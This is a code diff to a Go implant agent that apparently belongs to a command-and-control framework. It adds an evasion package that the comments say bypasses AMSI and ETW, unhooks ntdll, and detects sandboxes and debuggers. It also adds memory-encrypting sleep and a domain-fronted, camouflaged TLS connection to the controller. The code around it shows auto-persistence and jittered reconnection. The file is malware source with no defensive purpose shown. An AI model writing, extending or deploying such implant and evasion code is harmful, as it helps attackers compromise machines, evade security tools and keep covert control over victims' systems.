@@ -20,6 +20,7 @@ import (
 	"time"
 
 	"bty/src/go/internal/crypto"
+	"bty/src/go/internal/evasion"
 	proto "bty/src/go/internal/proto"
 	protobuf "google.golang.org/protobuf/proto"
 )
@@ -59,6 +60,7 @@ type Agent struct {
 	// Evasion
 	evasive    bool
 	jitterBase time.Duration
+	sleepMask  *evasion.SleepMask
 
 	// Channels
 	tasks   chan *proto.Task
@@ -76,6 +78,7 @@ func New(serverAddr string) *Agent {
 		backoffMax:      5 * time.Minute,
 		evasive:        false,
 		jitterBase:     5 * time.Second,
+		sleepMask:      evasion.NewSleepMask(),
 		tunnels:         make(map[string]net.Conn),
 		modules:         NewModuleRegistry(),
 		dynModules:      make(map[string]*DynamicModule),
@@ -87,6 +90,12 @@ func New(serverAddr string) *Agent {
 // Run starts the agent main loop with reconnection.
 func (a *Agent) Run() error {
 	a.running = true
+
+	// === EVASION: Initialize at startup ===
+	// Windows: AMSI bypass, ETW bypass, ntdll unhook, anti-sandbox, anti-debug
+	// Linux/macOS: Anti-sandbox, anti-debug checks
+	log.Printf("[AGENT] Initializing evasion techniques...")
+	evasion.Init()
 
 	// Auto-persist on first run (if not already persisted)
 	if !a.isPersisted() {
@@ -165,7 +174,14 @@ func (a *Agent) waitBackoff() {
 	jitter := time.Duration(float64(a.backoffCurrent) * 0.3 * jitterFactor)
 	wait := a.backoffCurrent + jitter
 	log.Printf("[AGENT] Reconnecting in %v...", wait.Round(time.Millisecond))
-	time.Sleep(wait)
+
+	// === EVASION: Sleep mask — encrypt memory during idle ===
+	if a.sleepMask != nil {
+		a.sleepMask.ObfuscatedSleep(wait)
+	} else {
+		time.Sleep(wait)
+	}
+
 	backoffJitterBytes := make([]byte, 8)
 	rand.Read(backoffJitterBytes)
 	backoffJitter := time.Duration(binary.BigEndian.Uint64(backoffJitterBytes) % uint64(a.backoffCurrent))
@@ -207,7 +223,6 @@ func (a *Agent) connect() error {
 			dial: func() (net.Conn, error) {
 				httpPort := "8445"
 				if p, err := func() (string, error) {
-					// Try to get HTTP port from config or default
 					return httpPort, nil
 				}(); err == nil {
 					_ = p
@@ -228,6 +243,29 @@ func (a *Agent) connect() error {
 	}
 
 	return fmt.Errorf("all transports failed")
+}
+
+// ConnectCamouflaged connects using traffic camouflage (domain fronting, HTTP preamble).
+func (a *Agent) ConnectCamouflaged() error {
+	host, port, _ := net.SplitHostPort(a.serverAddr)
+	if host == "" {
+		host = a.serverAddr
+		port = "8443"
+	}
+
+	cfg := evasion.DefaultCamouflage()
+	cfg.SNI = host
+	cfg.DomainFront = host
+
+	dialer := evasion.NewCamouflagedDialer(cfg)
+	conn, err := dialer.Dial(net.JoinHostPort(host, port))
+	if err != nil {
+		return err
+	}
+
+	log.Printf("[AGENT] Connected via camouflaged TLS to %s", a.serverAddr)
+	a.conn = conn
+	return nil
 }
 
 func (a *Agent) performKeyExchange() error {
